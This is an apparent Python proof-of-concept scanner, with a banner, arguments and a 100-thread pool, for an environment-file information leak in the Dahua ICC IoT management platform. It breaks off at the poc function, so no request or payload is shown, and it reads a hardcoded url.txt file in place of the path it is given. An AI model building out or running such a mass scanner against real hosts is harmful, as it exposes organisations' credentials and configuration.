#大华ICC智能物联综合管理平台env敏感信息泄露

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

# banner信息
def banner():
    text = '''


 _        __                           _   _               _                _                    
(_)      / _|                         | | (_)             | |              | |                   
 _ _ __ | |_ ___  _ __ _ __ ___   __ _| |_ _  ___  _ __   | |     ___  __ _| | ____ _  __ _  ___ 
| | '_ \|  _/ _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \  | |    / _ \/ _` | |/ / _` |/ _` |/ _ \
| | | | | || (_) | |  | | | | | | (_| | |_| | (_) | | | | | |___|  __/ (_| |   < (_| | (_| |  __/
|_|_| |_|_| \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_| \_____/\___|\__,_|_|\_\__,_|\__, |\___|
                                                                                       __/ |     
                                                                                      |___/                                                                
                                                                     version:DH_ICC_env_Information_Leakage 1.0
                                                                     Author: Laow🚦
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="大华ICC智能物联综合管理平台env敏感信息泄露")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        #处理数据，加线程
        url_list=[]
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")   

def poc(target):
 
